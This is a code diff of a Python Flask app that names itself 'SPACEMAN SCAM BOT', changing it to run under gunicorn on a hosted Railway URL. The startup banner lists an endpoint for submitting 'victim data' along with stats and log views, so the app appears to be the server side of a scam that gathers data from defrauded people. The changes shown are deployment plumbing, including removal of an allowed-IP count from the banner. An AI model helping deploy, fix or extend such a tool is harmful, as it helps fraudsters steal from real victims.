@@ -439,10 +439,8 @@ def cleanup_old_data():
         except Exception as e:
             logger.error(f"Cleanup failed: {e}")
 
-# Cloud deployment setup
-def create_app():
-    """Create Flask app for cloud deployment"""
-    return app
+# ========== CLOUD DEPLOYMENT SETUP ==========
+application = app  # ⬅️ BARIS PENTING untuk gunicorn di Railway
 
 # Main function
 if __name__ == "__main__":
@@ -450,6 +448,7 @@ if __name__ == "__main__":
     init_database()
     
     # Create necessary directories
+    import os
     for directory in [setting.PATHS["LOGS_DIR"], setting.PATHS["BACKUP_DIR"]]:
         os.makedirs(directory, exist_ok=True)
     
@@ -468,8 +467,8 @@ if __name__ == "__main__":
     🚀 SPACEMAN SCAM BOT v{setting.SCAM['VERSION']}
     ==========================================
     🔗 Website: {setting.SCAM['WEBSITE_URL']}
-    🌐 API URL: http://{host}:{port}
-    📞 Endpoint: http://{host}:{port}/api/victim
+    🌐 API URL: https://memek-production.up.railway.app
+    📞 Endpoint: /api/victim
     
     📊 Bot Status: ONLINE
     ⏰ Start Time: {bot.start_time.strftime('%Y-%m-%d %H:%M:%S')}
@@ -480,7 +479,6 @@ if __name__ == "__main__":
     • Database: {setting.DATABASE['TYPE'].upper()}
     • Logging: {setting.LOGGING['LEVEL']}
     • Environment: {'CLOUD' if 'PORT' in os.environ else 'LOCAL'}
-    • Host: {host}:{port}
     
     📝 Available Endpoints:
     • GET  /              - Bot status
@@ -488,10 +486,9 @@ if __name__ == "__main__":
     • POST /api/victim    - Submit victim data
     • GET  /api/stats     - Statistics
     • GET  /api/logs      - View logs
-    
-    🔒 Security: {len(setting.SECURITY['ALLOWED_IPS'])} IPs allowed
     ==========================================
     """)
     
-    # Start Flask server
-    app.run(host=host, port=port, debug=setting.SERVER["DEBUG"])
+    # JANGAN PAKAI app.run() DI CLOUD!
+    # UNTUK LOCAL DEVELOPMENT SAJA, jika perlu:
+    # app.run(host='127.0.0.1', port=9000, debug=True)
